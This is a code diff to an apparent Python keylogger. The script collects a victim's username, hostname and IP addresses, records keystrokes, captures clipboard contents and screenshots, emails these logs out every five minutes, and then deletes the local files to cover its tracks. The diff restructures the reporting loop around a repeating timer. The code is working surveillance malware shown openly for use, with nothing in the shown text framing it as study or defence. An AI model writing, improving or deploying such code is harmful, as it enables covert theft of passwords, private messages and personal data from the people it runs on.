@@ -21,8 +21,6 @@ import socket
 import requests
 import platform
 import os
-
-import time
 import random
 
 # for clicking a screenshot & to check clipboard content
@@ -35,15 +33,13 @@ import threading
 
 
 
-# current date and time
-datetime = time.ctime(time.time())
 # fetch the username
 user = os.path.expanduser('~').split('\\')[2]
 # get the private IP address of the host
 privateIP = socket.gethostbyname(socket.gethostname())
 
 # default_msg stores all the system and user information that is inserted at the beginning of the log file
-default_msg = f" [***** LOG FILE *****]\n # Date/Time: {datetime}\n # User-Profile: {user}\n # Processor: {platform.processor()}\n # System: {platform.system()} {platform.version()}\n # Machine: {platform.machine()}\n # Hostname: {socket.gethostname()}\n # Private IP: {privateIP}\n"
+default_msg = f" [***** LOG FILE *****]\n # User-Profile: {user}\n # Processor: {platform.processor()}\n # System: {platform.system()} {platform.version()}\n # Machine: {platform.machine()}\n # Hostname: {socket.gethostname()}\n # Private IP: {privateIP}\n"
 try:
     # get the public IP address of the host
     publicIP = requests.get('https://api.ipify.org/').text
@@ -66,7 +62,7 @@ EMAIL_PASSWORD = "your_password OR Token"
 REPORT_EVERY = 300  # 300 => 300/60 = 5 minutes 
 
 # to monitor count of logs captured
-count = 1
+count = 0
 
 
 
@@ -192,40 +188,40 @@ def log_file():
 def send_logs():
     global count
     
-    time.sleep(REPORT_EVERY)
-    while True:
-        if len(logged_data) > 1:
-            try:
-                # generate the log files
-                log_file()
-                clipboard()
-                screenshot()
-                
-                # send email
-                send_email()
-                
-                # delete all the files permanently
-                for file in delete_file:
-                    os.remove(file)
-                
-                # reset the variables / clear the logged content for next interval
-                del logged_data[1:]
-                del delete_file[0:]
-                
-                count += 1
+    if len(logged_data) > 1:
+        try:
+            # generate the log files
+            log_file()
+            clipboard()
+            screenshot()
             
-            except:
-                # uncomment the line below for debugging
-                # print('[-] Error in creating log files OR Error in sending email\n')
-                pass
+            # send email
+            send_email()
+            
+        except:
+            # uncomment the line below for debugging
+            # print('[-] Error in creating log files OR Error in sending email\n')
+            pass
 
+    # delete all the files permanently
+    for file in delete_file:
+        os.remove(file)
+    
+    # reset the variables / clear the logged content for next interval
+    del logged_data[1:]
+    del delete_file[0:]
+    
+    count += 1
+    
+    timer = threading.Timer(interval=REPORT_EVERY, function=send_logs)
+    # set the thread daemon so that the thread terminates after 'main' terminates
+    timer.daemon = True
+    timer.start()
 
 
 # main function
 if __name__ == '__main__':
-    # set the thread daemon so that the thread terminates after 'main' terminates
-    t = threading.Thread(target=send_logs, daemon=True)
-    t.start()
+    send_logs()
     
     # A listener for keyboard events
     with Listener(on_press=on_press, on_release=on_release) as listener:
